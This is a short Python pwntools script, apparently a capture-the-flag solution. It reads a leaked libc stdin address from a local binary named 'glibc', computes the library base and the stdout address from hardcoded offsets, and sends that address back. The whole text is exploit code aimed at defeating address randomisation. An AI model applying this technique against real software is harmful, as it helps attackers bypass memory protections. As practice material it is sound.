from pwn import *

stdoutOffset = "0x000000000021b780"
stdinOffset = "0x000000000021aaa0"

p = process("glibc")

print(p.recv())
p.send(b"gsl9701\n")
print(p.recvuntil(b": "))

stdinAddr = p.recvuntil(b"\n").strip()
print("Stripped bytes: " + str(stdinAddr))

stdinAddr = stdinAddr[::-1]
print("Reversed: " + str(stdinAddr))

stdinHex = stdinAddr.hex()
print("Hex conversion: " + stdinHex)

if len(stdinHex) % 2 != 0:
    stdinHex = '0' + stdinHex

baseAddr = hex(int(stdinHex,16) - int(stdinOffset,16))
stdoutAddr = hex(int(baseAddr,16) + int(stdoutOffset,16))

stdoutHex = f"{int(stdoutAddr, 16):0{len(stdinHex)}x}"
stdoutBytes = bytes.fromhex(stdoutHex)
stdoutBytes = stdoutBytes[::-1]
print("stdoutBytes: " + str(stdoutBytes))

print(p.recvuntil(b"> ").decode())
p.sendline(stdoutBytes)
print(p.recv().decode())
